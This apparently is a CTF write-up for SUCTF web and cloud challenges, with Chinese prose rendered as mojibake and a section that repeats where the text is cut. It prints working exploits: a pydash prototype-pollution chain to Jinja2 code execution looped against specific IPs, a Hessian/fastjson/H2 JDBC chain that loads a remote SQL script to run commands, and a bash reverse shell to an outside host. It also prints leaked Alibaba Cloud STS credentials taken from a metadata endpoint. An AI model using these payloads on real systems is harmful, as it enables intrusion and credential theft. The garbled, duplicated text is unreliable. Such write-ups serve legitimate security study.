äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: 